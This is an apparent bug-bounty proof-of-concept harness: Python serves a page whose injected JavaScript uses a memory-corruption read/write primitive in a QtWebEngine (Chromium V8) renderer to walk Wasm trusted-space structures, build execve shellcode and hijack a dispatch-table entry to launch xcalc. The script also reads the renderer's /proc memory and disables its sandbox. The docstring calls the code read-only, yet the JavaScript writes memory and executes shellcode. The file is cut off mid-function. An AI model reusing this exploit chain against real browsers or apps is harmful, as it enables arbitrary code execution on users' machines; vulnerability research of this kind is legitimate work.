#!/usr/bin/env python3
"""W92 recon_walk (A2) — pagemap-safe TPT scan to find WasmDispatchTable entry[0].

Chrome 130 moved WasmDispatchTable/WasmTrustedInstanceData/WasmExportedFunctionData
into TRUSTED SPACE. The SFI's trusted_function_data is a TrustedPointerHandle whose
decode (kTrustedPointerHandleShift) is indeterminable from the pinned source, and
the TPT has a sparse/null-prefixed committed layout (reading uncommitted pages
SIGSEGVs the renderer). So instead of decoding the handle, we SCAN the bounded TPT
region (commitment-checked lab-side via /proc/pid/pagemap) for the entry whose
target is a WasmExportedFunctionData with function_index == 10 (probe_mget).

  TrustedCageBase = IsolateData[+0x260]   (kIsolateTrustedCageBaseOffset)
  TPT_base        = IsolateData[+0x268]   (TrustedPointerTable.base @ +0)
  scan TPT (committed pages only) for trusted-cage pointer P whose
    WasmExportedFunctionData @ P has function_index (+0x1c, Smi) == 20  (func 10)
      P[+0x18] instance_data (protected ptr -> WasmTrustedInstanceData)
        WTI[+0x08] dispatch_table0 (protected ptr -> WasmDispatchTable)
          WDT[+0x10] entry[0].target  (raw 8-byte Address; what call_indirect loads+jmps)

READ-ONLY (probe_mget only). Lab-side pagemap read for commitment safety only.
Auth: BBP #3895069. Loopback only. Tag [M].
"""
import http.server, threading, json, os, sys, time, subprocess, glob, re, struct
import urllib.parse as up

# poc_wlinux.py lives alongside this file.
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

beacons = []
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9320
TGT = "/home/veritas/wickr-target"
VENV_PY = "/home/veritas/wickr-poc/.venv/bin/python"
QTHOST = "/home/veritas/wickr-poc/qthost.py"
RENDERER_PID = None  # set when MEMBI-OK fires
TPT_WINDOW = 0x40000  # 256KB TPT scan window

INJECT_MARKER = "// ======================= Bank values for post-Fire-4 ======================"

MEASURE_JS = r"""
// ====================== W92 RECON (A2): pagemap-safe TPT scan ==============
// READ-ONLY: probe_mget only. Every local _w92_-prefixed.
try {
  function _w92_mget8(_w92_T){
    try { return E.probe_mget(_w92_T - memBI) & 0xff; }
    catch(_w92_e){ return 0xff; }
  }
  function _w92_mget64(_w92_T){
    var _w92_v = 0n;
    for (var _w92_k = 0; _w92_k < 8; _w92_k++)
      _w92_v |= BigInt(_w92_mget8(_w92_T + BigInt(_w92_k))) << (BigInt(_w92_k) * 8n);
    return _w92_v;
  }
  function _w92_mget32(_w92_T){
    var _w92_v = 0;
    for (var _w92_k = 0; _w92_k < 4; _w92_k++)
      _w92_v |= _w92_mget8(_w92_T + BigInt(_w92_k)) << (8 * _w92_k);
    return _w92_v >>> 0;
  }
  function _w92_ph64(_w92_v){
    var _w92_lo = Number(_w92_v & 0xffffffffn) >>> 0;
    var _w92_hi = Number((_w92_v >> 32n) & 0xffffffffn) >>> 0;
    return ('00000000' + _w92_hi.toString(16)).slice(-8) +
           ('00000000' + _w92_lo.toString(16)).slice(-8);
  }
  function _w92_hx(_w92_n){ return '0x'+(_w92_n>>>0).toString(16); }

  _sync({step:'W92-START', cageBI:'0x'+cageBI.toString(16), memBI:'0x'+memBI.toString(16)});

  // ---- fetch lab-side candidate data ----
  var _w92_addrs = null;
  for (var _w92_ft = 0; _w92_ft < 30 && !_w92_addrs; _w92_ft++) {
    try {
      var _w92_r = new XMLHttpRequest(); _w92_r.open('GET', '/addrs', false); _w92_r.send(null);
      var _w92_rv = _w92_r.responseText;
      if (_w92_rv && _w92_rv.length > 2) _w92_addrs = JSON.parse(_w92_rv);
    } catch(_w92_e) {}
    var _w92_st = Date.now(); while (Date.now() - _w92_st < 100) {}
  }
  var _w92_regions = _w92_addrs && _w92_addrs.regions ? _w92_addrs.regions : [];
  for (var _w92_i = 0; _w92_i < _w92_regions.length; _w92_i++) {
    _w92_regions[_w92_i].lo = BigInt(_w92_regions[_w92_i].lo);
    _w92_regions[_w92_i].hi = BigInt(_w92_regions[_w92_i].hi);
  }
  var _w92_bandLo = _w92_addrs && _w92_addrs.stack_band ? Number(_w92_addrs.stack_band[0]) : 0x7ff0;
  var _w92_bandHi = _w92_addrs && _w92_addrs.stack_band ? Number(_w92_addrs.stack_band[1]) : 0x7fff;
  var _w92_check = _w92_addrs && _w92_addrs.check ? _w92_addrs.check : [];
  var _w92_rwxp = _w92_addrs && _w92_addrs.rwxp ? _w92_addrs.rwxp : [];
  function _w92_inRwxp(_w92_v){
    for (var _w92_i = 0; _w92_i < _w92_rwxp.length; _w92_i++) {
      var _w92_lo = BigInt(_w92_rwxp[_w92_i][0]), _w92_hi = BigInt(_w92_rwxp[_w92_i][1]);
      if (_w92_v >= _w92_lo && _w92_v < _w92_hi) return true;
    }
    return false;
  }

  // ===================== LOCATE IsolateData (proven step1_iso scan) ===========
  var _w92_probeLive = _w92_check.length > 0 ? (_w92_mget64(BigInt(_w92_check[0])) !== 0n) : false;
  _sync({step:'W92-PROBE', live:_w92_probeLive, nRegions:_w92_regions.length, nRwxp:_w92_rwxp.length,
    rwxp:_w92_rwxp});

  var _w92_iso = 0n;
  if (_w92_probeLive && _w92_regions.length > 0) {
    var _w92_cageHi = Number((cageBI >> 32n) & 0xffffffffn);
    var _w92_sigB4 = _w92_cageHi & 0xff, _w92_sigB5 = (_w92_cageHi >> 8) & 0xff;
    _w92_outer:
    for (var _w92_ri = 0; _w92_ri < _w92_regions.length; _w92_ri++) {
      var _w92_R = _w92_regions[_w92_ri];
      var _w92_baseIdx = _w92_R.lo - memBI;
      var _w92_idx4 = _w92_baseIdx + 4n, _w92_idx5 = _w92_baseIdx + 5n;
      var _w92_nQw = (Number(_w92_R.hi - _w92_R.lo) - 0x40) >> 3;
      for (var _w92_qi = 0; _w92_qi < _w92_nQw; _w92_qi++) {
        if (((E.probe_mget(_w92_idx4) & 0xff) !== _w92_sigB4) ||
            ((E.probe_mget(_w92_idx5) & 0xff) !== _w92_sigB5)) {
          _w92_idx4 += 8n; _w92_idx5 += 8n; continue;
        }
        _w92_idx4 += 8n; _w92_idx5 += 8n;
        var _w92_addr = _w92_R.lo + BigInt(_w92_qi * 8);
        if (_w92_mget64(_w92_addr) !== cageBI) continue;
        var _w92_nStack = 0;
        for (var _w92_k = 1; _w92_k <= 7; _w92_k++) {
          var _w92_q = _w92_mget64(_w92_addr + BigInt(_w92_k * 8));
          var _w92_top16 = Number((_w92_q >> 32n) & 0xffffn);
          if (_w92_top16 >= _w92_bandLo && _w92_top16 <= _w92_bandHi) _w92_nStack++;
        }
        if (_w92_nStack >= 1) { _w92_iso = _w92_addr; break _w92_outer; }
      }
    }
  }
  _sync({step:'W92-ISO', iso:_w92_iso?('0x'+_w92_iso.toString(16)):'0x0'});
  if (_w92_iso === 0n) { _sync({step:'W92-DONE', result:'no-iso'}); }
  else {

  // ===================== ISOLATEDATA TABLE BASES =============================
  var _w92_tcBase = _w92_mget64(_w92_iso + 0x260n);          // TrustedCageBase
  var _w92_tptBase = _w92_mget64(_w92_iso + 0x268n);         // TPT.base pointer
  _sync({step:'W92-IDATA', iso:_w92_ph64(_w92_iso),
    isoQ0:_w92_ph64(_w92_mget64(_w92_iso)),
    trustedCageBase:_w92_ph64(_w92_tcBase),
    tptBase:_w92_ph64(_w92_tptBase),
    eptBase:_w92_ph64(_w92_mget64(_w92_iso + 0x238n))});

  function _w92_inTrusted(_w92_v){
    if (_w92_tcBase === 0n) return false;
    return ((_w92_v >> 32n) & 0xffffffffn) === ((_w92_tcBase >> 32n) & 0xffffffffn) && _w92_v !== 0n;
  }

  // ===================== FETCH TPT COMMITTED PAGES (lab pagemap) =============
  var _w92_tptCommitted = {};   // pageBase(BigInt) -> true
  var _w92_srvWefds = [];       // server-side WEFD candidates (from /tptcheck)
  var _w92_tptBaseStr = _w92_tptBase.toString();
  for (var _w92_tt = 0; _w92_tt < 20 && Object.keys(_w92_tptCommitted).length === 0; _w92_tt++) {
    try {
      var _w92_x = new XMLHttpRequest();
      _w92_x.open('GET', '/tptcheck?base=' + _w92_tptBaseStr, false);
      _w92_x.send(null);
      var _w92_pd = JSON.parse(_w92_x.responseText);
      if (_w92_pd && _w92_pd.pages) {
        for (var _w92_pi = 0; _w92_pi < _w92_pd.pages.length; _w92_pi++)
          _w92_tptCommitted[BigInt(_w92_pd.pages[_w92_pi])] = true;
      }
      if (_w92_pd && _w92_pd.wefds && _w92_pd.wefds.length) _w92_srvWefds = _w92_pd.wefds;
    } catch(_w92_e) {}
    var _w92_st2 = Date.now(); while (Date.now() - _w92_st2 < 100) {}
  }
  var _w92_tptPages = Object.keys(_w92_tptCommitted).map(function(k){return BigInt(k);});
  _w92_tptPages.sort(function(a,b){ return a < b ? -1 : (a > b ? 1 : 0); });
  _sync({step:'W92-TPT-PAGES', nCommitted:_w92_tptPages.length,
    first:_w92_tptPages.length?_w92_ph64(_w92_tptPages[0]):'0x0',
    last:_w92_tptPages.length?_w92_ph64(_w92_tptPages[_w92_tptPages.length-1]):'0x0'});

  // ===================== WEFD candidates (server-side /proc/mem scan) =========
  // TPT scan done server-side via READ-ONLY /proc/pid/mem (W67/W68 lab read).
  // Avoids ~20K in-page probe_mget calls (8 confused calls/qword × sparse 49-page
  // TPT) which destabilise the corrupted heap and crash the real Wickr renderer.
  _sync({step:'W92-TPT-ENTRIES', nWefds:_w92_srvWefds.length, source:'server'});

  // ===================== /memcheck helper (lab pagemap commitment) ===========
  // Returns a Set of addresses whose page is committed. Guarantees no deref of
  // an uncommitted page (which SIGSEGVs the renderer).
  function _w92_memcheck(_w92_addrs){
    var _w92_set = {};
    try {
      var _w92_qs = _w92_addrs.map(function(a){return a.toString();}).join(',');
      var _w92_x = new XMLHttpRequest();
      _w92_x.open('GET', '/memcheck?addrs=' + _w92_qs, false);
      _w92_x.send(null);
      var _w92_pd = JSON.parse(_w92_x.responseText);
      if (_w92_pd && _w92_pd.committed) {
        for (var _w92_i = 0; _w92_i < _w92_pd.committed.length; _w92_i++)
          _w92_set[_w92_pd.committed[_w92_i]] = true;
      }
    } catch(_w92_e) {}
    return _w92_set;
  }

  // ===================== Find WEFData (full scan + hi16 prefilter) ============
  // TPT entry = tagged ptr with high-16 mark + low-3 tag.
  // obj base = (entry & 0xFFFFFFFFFFFF) - (entry & 7). TrustedCageBase = iso+0x260.
  // WasmExportedFunctionData: qword @ base+0x18 = {lo32: instance_data (protected),
  // hi32: function_index (Smi)}. probe_mget=func10 => hi32==20; probe_mset=11 => 22.
  // On the real device (more trusted objects than the harness), the WEFData may
  // be deep in the TPT. Scan ALL entries (no cap). Prefilter by hi16 (bits 32-47
  // must match the trusted-cage pattern) to skip garbage; prefiltered entries are
  // live trusted pointers → committed → safe to deref base+0x18 directly.
  var _w92_tcHi16 = Number((_w92_tcBase >> 32n) & 0xFFFFn);
  function _w92_baseOf(_w92_ev){ var _w92_m=_w92_ev & 0xffffffffffffn; return _w92_m - (_w92_m & 7n); }
  var _w92_wefds = [];
  for (var _w92_i = 0; _w92_i < _w92_entries.length && _w92_wefds.length < 4; _w92_i++) {
    var _w92_ev = _w92_entries[_w92_i];
    if (Number((_w92_ev >> 32n) & 0xFFFFn) !== _w92_tcHi16) continue;  // skip non-cage entries
    var _w92_b = _w92_baseOf(_w92_ev);
    var _w92_q18 = _w92_mget64(_w92_b + 0x18n);
    var _w92_fi = Number((_w92_q18 >> 32n) & 0xffffffffn) >>> 0;
    if (_w92_fi === 20 || _w92_fi === 22) {
      _w92_wefds.push({base:_w92_ph64(_w92_b), entry:_w92_ph64(_w92_ev),
        funcIdx:_w92_fi>>1, inst32:_w92_hx(Number(_w92_q18 & 0xffffffffn)>>>0)});
    }
  }
  _sync({step:'W92-WEFD', n:_w92_wefds.length, nEntries:_w92_entries.length, wefds:_w92_wefds});

  // ===================== WALK WEFData -> entry[0].target ====================
  // protected ptr (4-byte compressed, trusted-cage-relative): abs = tcBase + field32.
  // Memcheck each hop's deref address; report committed status so a break point
  // (wrong protected-ptr encoding / uncommitted page) is visible, not a crash.
  function _w92_protField(_w92_fieldAddr){
    var _w92_q = _w92_mget64(_w92_fieldAddr);
    var _w92_f32 = Number(_w92_q & 0xffffffffn) >>> 0;
    // protected ptrs are TAGGED compressed (low bits) — clear them for an
    // 8-aligned object base (same convention as TPT entry demasking).
    var _w92_off = _w92_f32 - (_w92_f32 & 7);
    return {abs:_w92_tcBase + BigInt(_w92_off), raw:_w92_ph64(_w92_q), off32:_w92_hx(_w92_off)};
  }
  for (var _w92_wi = 0; _w92_wi < _w92_wefds.length; _w92_wi++) {
    var _w92_w = _w92_wefds[_w92_wi];
    var _w92_wefd = BigInt('0x'+_w92_w.base);
    var _w92_instF = _w92_protField(_w92_wefd + 0x18n);   // instance_data -> WTI
    var _w92_mc1 = _w92_memcheck([_w92_instF.abs]);
    var _w92_instOK = !!_w92_mc1[_w92_instF.abs.toString()];
    var _w92_O = {wefd:_w92_w.base, funcIdx:_w92_w.funcIdx,
      instAbs:_w92_ph64(_w92_instF.abs), instCommitted:_w92_instOK};
    if (!_w92_instOK) { _sync({step:'W92-WALK', out:_w92_O, err:'inst not committed'}); continue; }

    // WTI layout (source: wasm-objects.h FIELD_LIST, ExposedTrustedObject base=8):
    //   +0x08 kProtectedDispatchTable0Offset  (cached table-0 WDT, protected ptr)
    //   +0x30 kJumpTableStartOffset           (raw Address)
    //   +0xA0 kProtectedDispatchTablesOffset  (DRUMBRAKE OFF; +0xA4 if ON)
    // WasmDispatchTable (source wasm-objects.h:758-784, confirmed by W50 [P]):
    //   +0x04 length(int32); +0x10 kEntriesOffset; entry=16B; entry+0 = target(raw 8B)
    //   => entry[0].target = WDT + 0x10
    // The module has 1 table (index 0), so dispatch_table0 (+0x08) IS our WDT.
    var _w92_dt0F = _w92_protField(_w92_instF.abs + 0x08n);   // dispatch_table0 -> WDT
    var _w92_jump = _w92_mget64(_w92_instF.abs + 0x30n);      // jump_table_start
    _w92_O.dt0 = {abs:_w92_ph64(_w92_dt0F.abs), raw:_w92_dt0F.raw, off32:_w92_dt0F.off32};
    _w92_O.jumpTable = _w92_ph64(_w92_jump);
    _w92_O.jumpInRwxp = _w92_inRwxp(_w92_jump);
    var _w92_mcDt = _w92_memcheck([_w92_dt0F.abs, _w92_dt0F.abs + 0x10n, _w92_dt0F.abs + 0x18n]);
    _w92_O.dt0Committed = !!_w92_mcDt[_w92_dt0F.abs.toString()];
    if (_w92_O.dt0Committed) {
      var _w92_wdtQ0 = _w92_mget64(_w92_dt0F.abs);
      _w92_O.wdtLen = Number((_w92_mget64(_w92_dt0F.abs + 0x00n) >> 32n) & 0xffffffffn) >>> 0; // +0x04 length
      _w92_O.ent0Target = _w92_ph64(_w92_mget64(_w92_dt0F.abs + 0x10n));   // entry[0].target
      _w92_O.ent0InRwxp = _w92_inRwxp(BigInt('0x'+_w92_O.ent0Target));
      _w92_O.ent0ImplArg = _w92_ph64(_w92_mget64(_w92_dt0F.abs + 0x18n));  // entry[0].implicit_arg
      _w92_O.ent0Sig = _w92_mget32(_w92_dt0F.abs + 0x1cn);                 // entry[0].sig
    }
    _sync({step:'W92-WALK', out:_w92_O});

    // ===== STEP 2 XCALC: execve wrapper via entry[0].target redirect =====
    if (_w92_O.ent0InRwxp && _w92_O.dt0Committed) {
      var _w92_ent0 = BigInt('0x'+_w92_O.ent0Target);
      var _w92_wdt = _w92_dt0F.abs;
      var _w92_stageAddr = _w92_ent0 | 0x800n;
      // execve("/usr/bin/xcalc", [path,NULL], ["DISPLAY=:0",NULL]) — built from
      // the path + env strings (no hardcoded bytes). No wrapper needed: DISPLAY=:0
      // is passed via envp (renderer env is scrubbed). Ends in syscall (no ret).
      var _w92_pathBytes = function(_w92_s){
        var _w92_b=[]; for(var _w92_i=0;_w92_i<_w92_s.length;_w92_i++) _w92_b.push(_w92_s.charCodeAt(_w92_i));
        while(_w92_b.length%8!==0) _w92_b.push(0); return _w92_b; };
      var _w92_pb = _w92_pathBytes("/usr/bin/xcalc");
      var _w92_eb = _w92_pathBytes("DISPLAY=:0");
      var _w92_sc = [0x48,0x31,0xd2];                                  // xor rdx,rdx (NULL)
      var _w92_pushQ = function(_w92_b, _w92_ci){
        var _w92_q=0n; for(var _w92_k=0;_w92_k<8;_w92_k++) _w92_q|=BigInt(_w92_b[_w92_ci*8+_w92_k])<<(BigInt(_w92_k)*8n);
        var _w92_lo=Number(_w92_q&0xffffffffn)>>>0, _w92_hi=Number((_w92_q>>32n)&0xffffffffn)>>>0;
        _w92_sc.push(0x48,0xb8, _w92_lo&0xff,(_w92_lo>>8)&0xff,(_w92_lo>>16)&0xff,(_w92_lo>>24)&0xff,
                     _w92_hi&0xff,(_w92_hi>>8)&0xff,(_w92_hi>>16)&0xff,(_w92_hi>>24)&0xff); // mov rax,imm64
        _w92_sc.push(0x50);                                            // push rax
      };
      // push env string (reversed qwords), save ptr in r8
      for (var _w92_ci=_w92_eb.length/8-1; _w92_ci>=0; _w92_ci--) _w92_pushQ(_w92_eb, _w92_ci);
      _w92_sc.push(0x49,0x89,0xe0);  // mov r8,rsp (env string)
      // push path string (reversed qwords), rdi=rsp
      for (var _w92_ci=_w92_pb.length/8-1; _w92_ci>=0; _w92_ci--) _w92_pushQ(_w92_pb, _w92_ci);
      _w92_sc.push(0x48,0x89,0xe7);  // mov rdi,rsp (path)
      // argv = [path, NULL]
      _w92_sc.push(0x52);            // push rdx (NULL)
      _w92_sc.push(0x57);            // push rdi (argv[0])
      _w92_sc.push(0x48,0x89,0xe6);  // mov rsi,rsp (argv)
      // envp = [env, NULL]
      _w92_sc.push(0x52);            // push rdx (NULL)
      _w92_sc.push(0x41,0x50);       // push r8 (envp[0])
      _w92_sc.push(0x48,0x89,0xe2);  // mov rdx,rsp (envp)
      _w92_sc.push(0xb8,0x3b,0x00,0x00,0x00);  // mov eax,59 (execve; zero-extends rax)
      _w92_sc.push(0x0f,0x05);       // syscall
      for (var _w92_si=0n;_w92_si<BigInt(_w92_sc.length);_w92_si++)
        E.probe_mset(_w92_stageAddr-memBI+_w92_si, _w92_sc[Number(_w92_si)]);
      var _w92_last = BigInt(_w92_sc.length - 1);
      var _w92_scOK = ((E.probe_mget(_w92_stageAddr-memBI)&0xff)===0x48) &&
                      ((E.probe_mget(_w92_stageAddr-memBI+_w92_last)&0xff)===0x05);
      _sync({step:'W93-XSC', ok:_w92_scOK?1:0, stage:_w92_ph64(_w92_stageAddr), scLen:_w92_sc.length});
      if (_w92_scOK) {
        var _w92_newB1 = Number((_w92_stageAddr >> 8n) & 0xffn);
        E.probe_mset(_w92_wdt+0x11n-memBI, _w92_newB1);
        _sync({step:'W93-XCALC-FIRE', stage:_w92_ph64(_w92_stageAddr)});
        try { E.probe_mget(0n); } catch(_w92_fe){}   // execve replaces process; no return
        _sync({step:'W92-DONE', result:'xcalc-fired'});
      }
    }
  }

  _sync({step:'W92-DONE', result:'recon-complete'});
  } // iso found
} catch (_w92_e) {
  _sync({step:'W92-ERR', err:String(_w92_e).slice(0, 400)});
}
"""


def _ph64(v):
    """Format as 16-char hex (matches JS _w92_ph64: no 0x prefix)."""
    return f"{v:016x}"


def scan_tpt_wefds(pid, tpt_base, window):
    """LAB-SIDE READ-ONLY: scan TPT pages via /proc/pid/mem; find WEFData
    candidates (function_index Smi 20/22 at base+0x18 = probe_mget/mset).
    Returns list of {base, entry, funcIdx, inst32} dicts."""
    wefds = []
    if not pid:
        return wefds
    pages = committed_tpt_pages(pid, tpt_base, window)
    if not pages:
        return wefds
    entries = []
    try:
        with open(f"/proc/{pid}/mem", "rb") as f:
            for pg in pages:
                try:
                    f.seek(pg)
                    data = f.read(0x1000)
                except Exception:
                    continue
                if len(data) < 0x1000:
                    continue
                for off in range(0, 0x1000, 8):
                    v = struct.unpack_from("<Q", data, off)[0]
                    if v:
                        entries.append(v)
    except Exception:
        pass
    if not entries:
        return wefds
    hc = {}
    for e in entries:
        h = (e >> 32) & 0xFFFFFFFF
        hc[h] = hc.get(h, 0) + 1
    best = max(hc, key=lambda k: hc[k]) if hc else 0
    nread = 0
    try:
        with open(f"/proc/{pid}/mem", "rb") as f:
            for e in entries:
                if ((e >> 32) & 0xFFFFFFFF) != best:
                    continue
                b = (e & 0xFFFFFFFFFFFF) - (e & 7)
                if b < 0x1000:
                    continue
                nread += 1
                if nread > 2000:
                    break
                try:
                    f.seek(b + 0x18)
                    raw = f.read(8)
                except Exception:
                    continue
                if len(raw) < 8:
                    continue
                q18 = struct.unpack("<Q", raw)[0]
                fi = (q18 >> 32) & 0xFFFFFFFF
                if fi in (20, 22):
                    wefds.append({"base": _ph64(b), "entry": _ph64(e),
                                  "funcIdx": fi >> 1,
                                  "inst32": hex(q18 & 0xFFFFFFFF)})
                    if len(wefds) >= 8:
                        break
    except Exception:
        pass
    return wefds


def committed_tpt_pages(pid, base, window):
    """LAB-SIDE: read /proc/pid/pagemap, return committed 4KB page bases in [base, base+window)."""
    pages = []
    if not pid:
        return pages
    n = window // 0x1000
    try:
        with open(f"/proc/{pid}/pagemap", "rb") as f:
            f.seek((base // 0x1000) * 8)
            for i in range(n):
                raw = f.read(8)
                if len(raw) < 8:
                    break
                e = struct.unpack("Q", raw)[0]
                if e & (1 << 63):
                    pages.append(base + i * 0x1000)
    except Exception:
        pass
    return pages


class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    page = b""
    addrs_json = b"{}"
    def do_GET(self):
        global RENDERER_PID
        if self.path.startswith("/memcheck"):
            q = up.parse_qs(up.urlsplit(self.path).query)
            addrs = []
            if "addrs" in q and q["addrs"][0]:
                addrs = [int(x) for x in q["addrs"][0].split(",") if x]
            # batch: open pagemap once, check each addr's page (present bit 63)
            committed = []
            try:
                with open(f"/proc/{RENDERER_PID}/pagemap", "rb") as pmf:
                    for a in addrs:
                        pg = a & ~0xFFF
                        pmf.seek((pg // 0x1000) * 8)
                        raw = pmf.read(8)
                        if len(raw) == 8 and (struct.unpack("Q", raw)[0] & (1 << 63)):
                            committed.append(str(a))
            except Exception:
                pass
            body = json.dumps({"committed": committed}).encode()
            self.send_response(200); self.send_header("Content-Type","application/json")
            self.send_header("Content-Length", str(len(body))); self.end_headers()
            try: self.wfile.write(body)
            except: pass
            return
        if self.path.startswith("/tptcheck"):
            q = up.parse_qs(up.urlsplit(self.path).query)
            try:
                base = int(q["base"][0])
            except Exception:
                body = b'{"pages":[]}';
                self.send_response(200); self.send_header("Content-Type","application/json")
                self.send_header("Content-Length", str(len(body))); self.end_headers()
                try: self.wfile.write(body)
                except: pass
                return
            pages = committed_tpt_pages(RENDERER_PID, base, TPT_WINDOW)
            wefds = scan_tpt_wefds(RENDERER_PID, base, TPT_WINDOW)
            body = json.dumps({"pages": [str(p) for p in pages],
                               "wefds": wefds}).encode()
            self.send_response(200); self.send_header("Content-Type","application/json")
            self.send_header("Content-Length", str(len(body))); self.end_headers()
            try: self.wfile.write(body)
            except: pass
            return
        if self.path == "/addrs":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(self.addrs_json)))
            self.end_headers()
            try: self.wfile.write(self.addrs_json)
            except: pass
            return
        body = self.page if self.path != "/leak" else json.dumps(beacons[-200:]).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html" if self.path != "/leak" else "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        try: self.wfile.write(body)
        except: pass
    def do_POST(self):
        if self.path in ("/leak", "/log"):
            n = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(n) if n else b"{}"
            try: d = json.loads(raw)
            except: d = {"raw": raw.decode("utf-8", "replace")}
            beacons.append(d)
            s = d.get("step", "")
            if s.startswith("W92") or s.startswith("W93") or s in ("CAGE", "MEMBI-OK", "MEMBI-FAIL"):
                msg = json.dumps(d)
                if len(msg) > 1400: msg = msg[:1400] + "...(truncated)"
                print(f"  *** [{s}] {msg}", flush=True)
            elif s:
                print(f"  [{s}]", flush=True)
        b = b'{"ok":true}'
        self.send_response(200)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        try: self.wfile.write(b)
        except: pass
    def log_message(self, *a): pass


class Srv(http.server.ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def find_renderer_pid():
    best_pid, best_rwx = None, 0
    for p in glob.glob("/proc/[0-9]*/comm"):
        try:
            with open(p) as f: name = f.read().strip()
        except: continue
        if "QtWebEngine" not in name and "WebEngineProc" not in name:
            continue
        pid = int(p.split("/")[2])
        try:
            with open(f"/proc/{pid}/maps") as f: maps = f.read()
        except: continue
        rwx_bytes = 0
        for line in maps.splitlines():
            parts = line.split()
            if len(parts) < 2 or "rwxp" not in parts[1]: continue
            addrs = parts[0].split("-")
            rwx_bytes += int(addrs[1], 16) - int(addrs[0], 16)
        if rwx_bytes > best_rwx:
            best_rwx, best_pid = rwx_bytes, pid
    return best_pid


def collect_addrs(pid, cageBI, memBI):
    addrs = {"regions": [], "stack_band": [0x7ff0, 0x7fff], "check": [], "rwxp": []}
    if not pid:
        return addrs
    try:
        with open(f"/proc/{pid}/maps") as f: maps = f.read()
    except:
        return addrs
    SANDBOX_TOP = cageBI + 0x10000000000
    regions_raw = []
    libc_check = None
    for line in maps.splitlines():
        m = re.match(r"([0-9a-f]+)-([0-9a-f]+)\s+(\S+)(?:\s+\S+){2}\s*(.*)$", line)
        if not m: continue
        lo, hi = int(m.group(1), 16), int(m.group(2), 16)
        perms = m.group(3); path = m.group(4).strip()
        if not libc_check and "r-xp" in perms and "libc" in path:
            libc_check = lo
        if "rwxp" in perms and "---p" not in perms:
            addrs["rwxp"].append([str(lo), str(hi)])
        if "[stack]" in path:
            mid = (lo + hi) // 2
            addrs["stack_band"] = [min((mid >> 32) & 0xffff, (hi >> 32) & 0xffff),
                                   max((mid >> 32) & 0xffff, (hi >> 32) & 0xffff)]
        if "rw-p" not in perms: continue
        if cageBI <= lo < SANDBOX_TOP: continue
        if memBI <= lo < memBI + 0x100000000: continue
        if path.startswith("/"): continue
        sz = hi - lo
        if sz < 0x4000: continue
        is_heap = "[heap]" in path
        if not is_heap and sz > 4 * 1024 * 1024: continue
        regions_raw.append((lo, hi, sz, is_heap, "heap" if is_heap else f"anon@0x{lo:x}"))
    regions_raw.sort(key=lambda r: (not r[3], -r[2]))
    kept = []; total = 0
    for (lo, hi, sz, ish, name) in regions_raw:
        if total > 6 * 1024 * 1024: break
        kept.append((lo, hi, name)); total += sz
    addrs["regions"] = [{"lo": str(lo), "hi": str(hi), "name": name} for (lo, hi, name) in kept]
    if libc_check:
        addrs["check"] = [libc_check]
    return addrs


def main():
    global RENDERER_PID
    env = os.environ.copy()
    env.update({
        "QT_BASE_DIR": f"{TGT}/opt/Qtqt692",
        "LD_LIBRARY_PATH": f"{TGT}/opt/Qtqt692/lib:{TGT}/usr/lib:{TGT}/usr/lib/x86_64-linux-gnu",
        "QT_PLUGIN_PATH": f"{TGT}/opt/Qtqt692/plugins",
        "QTWEBENGINE_DISABLE_SANDBOX": "1",
        "DISPLAY": ":0",
        "XDG_RUNTIME_DIR": "/mnt/wslg/runtime-dir",
        "WAYLAND_DISPLAY": "wayland-0",
        "QT_QPA_PLATFORM": "xcb",
        "PULSE_SERVER": "unix:/mnt/wslg/PulseServer",
    })

    from poc_wlinux import make_page
    page = make_page(4, 12000, 320, 0x8000)
    page = page.replace("for(let o=0;o<0x100;o+=8){",
                        "for(let o=0x10;o<0x100;o+=8){")
    ms1 = "// ======================= Marker scan"
    ms2 = "// ======================= Bank values"
    i1 = page.find(ms1); i2 = page.find(ms2)
    if i1 >= 0 and i2 >= 0:
        page = page[:i1] + "let _markerCageAddr=0;\n" + page[i2:]

    if INJECT_MARKER not in page:
        print("FATAL: injection marker not found", flush=True)
        return 1
    page = page.replace(INJECT_MARKER, MEASURE_JS + "\n" + INJECT_MARKER, 1)
    H.page = page.encode()
    print(f"[runner] :{PORT} page={len(page)} bytes (A2 recon, READ-ONLY)", flush=True)

    saw_recon = False
    for attempt in range(1, 16):
        beacons.clear()
        H.addrs_json = b"{}"
        RENDERER_PID = None
        srv = Srv(("127.0.0.1", PORT), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        qt_log = open(f"/tmp/w92-qt-{PORT}-{attempt}.log", "w")
        qt = subprocess.Popen([VENV_PY, QTHOST, f"http://127.0.0.1:{PORT}/", "40"],
                              env=env, stdout=qt_log, stderr=subprocess.STDOUT)
        print(f"[attempt {attempt}] Qt launched (pid={qt.pid})", flush=True)

        cageBI = None
        t0 = time.time()
        while time.time() - t0 < 20:
            if qt.poll() is not None: break
            for b in beacons:
                if b.get("step") == "CAGE":
                    ch = int(str(b.get("cageHi", "0")).replace("0x", ""), 16)
                    cageBI = ch << 32; break
            if cageBI is not None: break
            time.sleep(0.2)

        if cageBI is None:
            print(f"[attempt {attempt}] no CAGE beacon", flush=True)
            try: qt.kill()
            except: pass
            subprocess.run(["pkill", "-9", "-f", "QtWebEngineProcess"], capture_output=True, timeout=5)
            try: srv.shutdown()
            except: pass
            try: srv.server_close()
            except: pass
            time.sleep(1); continue

        memBI = cageBI + 0x100000000
        print(f"[attempt {attempt}] CAGE OK: cageBI=0x{cageBI:x}", flush=True)

        membiOK = False
        t0 = time.time()
        while time.time() - t0 < 18:
            if qt.poll() is not None: break
            if any(b.get("step") == "MEMBI-OK" for b in beacons):
                membiOK = True
                pid = find_renderer_pid()
                RENDERER_PID = pid
                addrs = collect_addrs(pid, cageBI, memBI)
                H.addrs_json = json.dumps(addrs).encode()
                print(f"[attempt {attempt}] MEMBI-OK pid={pid} "
                      f"regions={len(addrs['regions'])} rwxp={len(addrs['rwxp'])}", flush=True)
                break
            time.sleep(0.2)

        if not membiOK:
            print(f"[attempt {attempt}] no MEMBI-OK (last: {[b.get('step') for b in beacons[-3:]]})", flush=True)
